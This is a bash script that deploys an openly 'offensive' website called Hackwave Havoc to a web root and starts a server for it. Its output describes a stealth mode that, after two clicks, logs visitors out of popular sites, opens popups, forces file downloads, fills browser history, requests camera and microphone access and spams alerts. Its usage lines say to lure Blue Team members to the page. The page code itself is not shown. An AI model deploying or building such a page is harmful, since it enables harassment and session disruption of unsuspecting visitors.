#!/bin/bash

# Hackwave Havoc Offensive Website Deployment Script
# Ultimate offensive webpage with stealth annoying mode

echo "🚀 Deploying Hackwave Havoc Offensive Website..."

# Configuration
TARGET_DIR="/var/www/html"
SOURCE_DIR="$(pwd)"
BACKUP_DIR="/tmp/hackwave_backup_$(date +%s)"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}[*] Starting offensive deployment...${NC}"

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   echo -e "${YELLOW}[!] Running as root - good for deployment${NC}"
else
   echo -e "${YELLOW}[!] Not running as root - some features may be limited${NC}"
fi

# Create backup of existing web content
if [ -d "$TARGET_DIR" ]; then
    echo -e "${BLUE}[*] Creating backup of existing web content...${NC}"
    mkdir -p "$BACKUP_DIR"
    cp -r "$TARGET_DIR"/* "$BACKUP_DIR"/ 2>/dev/null || true
    echo -e "${GREEN}[+] Backup created at: $BACKUP_DIR${NC}"
fi

# Deploy the offensive website
echo -e "${BLUE}[*] Deploying Hackwave Havoc offensive site...${NC}"
cp -r "$SOURCE_DIR"/* "$TARGET_DIR"/
chmod -R 755 "$TARGET_DIR"/
chown -R www-data:www-data "$TARGET_DIR"/ 2>/dev/null || true

echo -e "${GREEN}[+] Offensive website deployed to: $TARGET_DIR${NC}"

# Start Python server if available
if command -v python3 &> /dev/null; then
    echo -e "${BLUE}[*] Starting Python HTTP server...${NC}"
    cd "$TARGET_DIR"
    python3 server.py &
    SERVER_PID=$!
    echo -e "${GREEN}[+] Python server started with PID: $SERVER_PID${NC}"
    echo -e "${GREEN}[+] Website accessible at: http://localhost:8000${NC}"
else
    echo -e "${YELLOW}[!] Python3 not found - manual server start required${NC}"
    echo -e "${BLUE}[*] To start server manually: cd $TARGET_DIR && python3 server.py${NC}"
fi

# Create a quick test script
cat > "$TARGET_DIR/test_offensive.sh" << 'EOF'
#!/bin/bash
echo "🧪 Testing offensive website..."
echo "📱 Open browser to: http://localhost:8000"
echo "🔴 Click buttons 2 times to activate annoying mode"
echo "🚨 After 3 seconds, chaos will begin!"
echo ""
echo "Expected behaviors:"
echo "- Logout from popular sites (GitHub, Google, etc.)"
echo "- Open 5 popup windows"
echo "- Trigger file downloads"
echo "- Fill browser history with Rickroll URLs"
echo "- Speak annoying phrases"
echo "- Request camera/microphone permissions"
echo "- Vibrate mobile devices"
echo "- Change page title to scary messages"
echo "- Show alert spam"
EOF

chmod +x "$TARGET_DIR/test_offensive.sh"

echo -e "${GREEN}[+] Deployment complete!${NC}"
echo -e "${YELLOW}[!] IMPORTANT: This is an OFFENSIVE website${NC}"
echo -e "${YELLOW}[!] Use responsibly and only on authorized targets${NC}"
echo ""
echo -e "${BLUE}📋 Deployment Summary:${NC}"
echo -e "${GREEN}✅ Website deployed to: $TARGET_DIR${NC}"
echo -e "${GREEN}✅ Stealth mode: After 2 interactions${NC}"
echo -e "${GREEN}✅ Activation delay: 3 seconds${NC}"
echo -e "${GREEN}✅ Test script created: $TARGET_DIR/test_offensive.sh${NC}"
echo ""
echo -e "${RED}🚨 OFFENSIVE FEATURES ENABLED:${NC}"
echo -e "${RED}🔴 Logout attacks on 10+ popular sites${NC}"
echo -e "${RED}🔴 Popup spam (5 windows)${NC}"
echo -e "${RED}🔴 File download triggers${NC}"
echo -e "${RED}🔴 Browser history manipulation${NC}"
echo -e "${RED}🔴 Speech synthesis spam${NC}"
echo -e "${RED}🔴 Permission requests (camera, mic, etc.)${NC}"
echo -e "${RED}🔴 Device vibration${NC}"
echo -e "${RED}🔴 Page title changes${NC}"
echo -e "${RED}🔴 Alert spam${NC}"
echo ""
echo -e "${BLUE}🎯 Usage:${NC}"
echo -e "${BLUE}1. Deploy to target web server${NC}"
echo -e "${BLUE}2. Lure Blue Team members to visit${NC}"
echo -e "${BLUE}3. Watch chaos unfold after 2 interactions${NC}"
echo ""
echo -e "${GREEN}🚀 Ready for offensive operations!${NC}" 